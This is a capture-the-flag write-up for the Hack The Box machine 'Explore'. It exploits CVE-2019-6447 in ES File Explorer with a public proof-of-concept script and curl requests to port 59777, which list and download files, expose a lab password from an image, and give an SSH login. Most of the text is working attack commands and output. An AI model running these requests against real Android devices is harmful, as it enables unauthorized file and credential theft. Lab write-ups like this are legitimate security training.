# Enumeration-
Just simply googling for the port and es file explorer we came up with "ES File Explorer Open_ Port Vulnerability - CVE-2019-6447"

[Es File Explorer CVE](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)

```bash
root@napster:~/Documents/HTB/Explore# git clone https://github.com/fs0c131y/ESFileExplorerOpenPortVuln                                                        
Cloning into 'ESFileExplorerOpenPortVuln'...                                                                                                                  
remote: Enumerating objects: 56, done.                                                                                                                        
remote: Total 56 (delta 0), reused 0 (delta 0), pack-reused 56                                                                                                
Unpacking objects: 100% (56/56), 13.70 KiB | 107.00 KiB/s, done.                                                                                              
root@napster:~/Documents/HTB/Explore# cd ESFileExplorerOpenPortVuln/                                                                                          
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# clear                                                                                        
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# ls                                                                                           
poc.py  README.md  requirements.txt                                                                                                                           
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# pip install -r requirements.txt                                                              
.git/             poc.py            README.md         requirements.txt                                                                                        
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# pip install -r requirements.txt 
```

# Exploit-

```bash
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# python poc.py 
Usage:
- python3 poc.py list
- python3 poc.py --get-file [filepath]
- python3 poc.py --cmd [cmd]
- python3 poc.py --cmd [cmd] --host [target_host]
- python3 poc.py --cmd [cmd] --network [network]
- python3 poc.py --cmd [cmd] --pkg [package_name]
- python3 poc.py --verbose --cmd [cmd] --pkg [package_name]
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# python3 poc.py list
######################
# Available Commands #
######################

listFiles: List all the files
listPics: List all the pictures
listVideos: List all the videos
listAudios: List all the audio files
listApps: List all the apps installed
listAppsSystem: List all the system apps
listAppsPhone: List all the phone apps
listAppsSdcard: List all the apk files in the sdcard
listAppsAll: List all the apps installed (system apps included)
getDeviceInfo: Get device info. Package name parameter is needed
appPull: Pull an app from the device
appLaunch: Launch an app. Package name parameter is needed
getAppThumbnail: Get the icon of an app. Package name parameter is needed
```

### getDeviceInfo
```bash
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# python3 poc.py --cmd getDeviceInfo --ip 10.10.10.247
[*] Executing command: getDeviceInfo on 10.10.10.247
[*] Server responded with: 200
{"name":"VMware Virtual Platform", "ftpRoot":"/sdcard", "ftpPort":"3721"}
```

### listFiles		[sdcard available in the list]
```bash
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# python3 poc.py --cmd listFiles --host 10.10.10.247
[*] Executing command: listFiles on 10.10.10.247
[*] Server responded with: 200
[
{"name":"lib", "time":"3/25/20 05:12:02 AM", "type":"folder", "size":"12.00 KB (12,288 Bytes)", }, 
{"name":"vndservice_contexts", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"65.00 Bytes (65 Bytes)", }, 
{"name":"vendor_service_contexts", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_seapp_contexts", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_property_contexts", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"392.00 Bytes (392 Bytes)", }, 
{"name":"vendor_hwservice_contexts", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_file_contexts", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"6.92 KB (7,081 Bytes)", }, 
{"name":"vendor", "time":"3/25/20 12:12:33 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"ueventd.rc", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"5.00 KB (5,122 Bytes)", }, 
{"name":"ueventd.android_x86_64.rc", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"464.00 Bytes (464 Bytes)", }, 
{"name":"system", "time":"3/25/20 12:12:31 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"sys", "time":"6/28/21 01:21:55 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"storage", "time":"6/28/21 01:22:02 PM", "type":"folder", "size":"80.00 Bytes (80 Bytes)", }, 
{"name":"sepolicy", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"357.18 KB (365,756 Bytes)", }, 
{"name":"sdcard", "time":"4/21/21 02:12:29 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"sbin", "time":"6/28/21 01:21:55 PM", "type":"folder", "size":"140.00 Bytes (140 Bytes)", }, 
{"name":"product", "time":"3/24/20 11:39:17 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"proc", "time":"6/28/21 01:21:54 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"plat_service_contexts", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"13.73 KB (14,057 Bytes)", }, 
{"name":"plat_seapp_contexts", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"1.28 KB (1,315 Bytes)", }, 
{"name":"plat_property_contexts", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"6.53 KB (6,687 Bytes)", }, 
{"name":"plat_hwservice_contexts", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"7.04 KB (7,212 Bytes)", }, 
{"name":"plat_file_contexts", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"23.30 KB (23,863 Bytes)", }, 
{"name":"oem", "time":"6/28/21 01:21:55 PM", "type":"folder", "size":"40.00 Bytes (40 Bytes)", }, 
{"name":"odm", "time":"6/28/21 01:21:55 PM", "type":"folder", "size":"220.00 Bytes (220 Bytes)", }, 
{"name":"mnt", "time":"6/28/21 01:21:56 PM", "type":"folder", "size":"240.00 Bytes (240 Bytes)", }, 
{"name":"init.zygote64_32.rc", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"875.00 Bytes (875 Bytes)", }, 
{"name":"init.zygote32.rc", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"511.00 Bytes (511 Bytes)", }, 
{"name":"init.usb.rc", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"5.51 KB (5,646 Bytes)", }, 
{"name":"init.usb.configfs.rc", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"7.51 KB (7,690 Bytes)", }, 
{"name":"init.superuser.rc", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"582.00 Bytes (582 Bytes)", }, 
{"name":"init.rc", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"29.00 KB (29,697 Bytes)", }, 
{"name":"init.environ.rc", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"1.04 KB (1,064 Bytes)", }, 
{"name":"init.android_x86_64.rc", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"3.36 KB (3,439 Bytes)", }, 
{"name":"init", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"2.29 MB (2,401,264 Bytes)", }, 
{"name":"fstab.android_x86_64", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"753.00 Bytes (753 Bytes)", }, 
{"name":"etc", "time":"3/25/20 03:41:52 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"dev", "time":"6/28/21 01:21:57 PM", "type":"folder", "size":"2.64 KB (2,700 Bytes)", }, 
{"name":"default.prop", "time":"6/28/21 01:21:55 PM", "type":"file", "size":"1.09 KB (1,118 Bytes)", }, 
{"name":"data", "time":"3/15/21 04:49:09 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"d", "time":"6/28/21 01:21:54 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"config", "time":"6/28/21 01:21:56 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"charger", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"cache", "time":"6/28/21 01:21:56 PM", "type":"folder", "size":"120.00 Bytes (120 Bytes)", }, 
{"name":"bugreports", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"bin", "time":"3/25/20 12:26:22 AM", "type":"folder", "size":"8.00 KB (8,192 Bytes)", }, 
{"name":"acct", "time":"6/28/21 01:21:55 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }
]
```

## Using Curl  to exploit further-
Reference-
```bash
curl --header "Content-Type: application/json" --request POST --data '{"command":"[my_awesome_cmd]"}' http://192.168.0.8:59777
```

### listFile on /sdcard-			[user.txt]
```bash
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://10.10.10.247:59777/sdcard/
[
{"name":"Android", "time":"3/13/21 05:16:50 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":".estrongs", "time":"3/13/21 05:30:39 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"Download", "time":"3/13/21 05:37:03 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"dianxinos", "time":"4/21/21 02:12:29 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"Notifications", "time":"3/13/21 05:16:51 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"DCIM", "time":"4/21/21 02:38:16 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"Alarms", "time":"3/13/21 05:16:51 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"Podcasts", "time":"3/13/21 05:16:51 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"Pictures", "time":"3/13/21 05:16:51 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":".userReturn", "time":"6/28/21 01:22:34 PM", "type":"file", "size":"72.00 Bytes (72 Bytes)", }, 
{"name":"user.txt", "time":"3/13/21 06:28:55 PM", "type":"file", "size":"33.00 Bytes (33 Bytes)", }, 
{"name":"Movies", "time":"3/13/21 05:16:51 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"Music", "time":"3/13/21 05:16:51 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"backups", "time":"3/13/21 05:30:13 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"Ringtones", "time":"3/13/21 05:16:51 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }
```

# User.txt-

```bash
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# curl http://10.10.10.247:59777/sdcard/user.txt
f32017174c7c7e8f50c6da52891ae250
```

# Creds-		[creds.jpg]

```bash
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://10.10.10.247:59777/sdcard/DCIM
[
{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "type":"file", "size":"135.33 KB (138,573 Bytes)", }, 
{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "type":"file", "size":"6.24 KB (6,392 Bytes)", }, 
{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "type":"file", "size":"1.14 MB (1,200,401 Bytes)", }, 
{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "type":"file", "size":"124.88 KB (127,876 Bytes)", }
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln#  curl http://10.10.10.247:59777/sdcard/DCIM/creds.jpg -o creds.jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1172k  100 1172k    0     0   833k      0  0:00:01  0:00:01 --:--:--  833k
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# ls
creds.jpg  poc.py  README.md  requirements.txt
```

![[Pasted image 20210628165331.png]]


User- kristi
pass- Kr1sT!5h@Rp3xPl0r3!


# SSH-

```bash
root@napster:~/Documents/HTB/Explore/ESFileExplorerOpenPortVuln# ssh  kristi@10.10.10.247 -p2222
The authenticity of host '[10.10.10.247]:2222 ([10.10.10.247]:2222)' can't be established.
RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.247]:2222' (RSA) to the list of known hosts.
Password authentication
Password: 
:/ $
```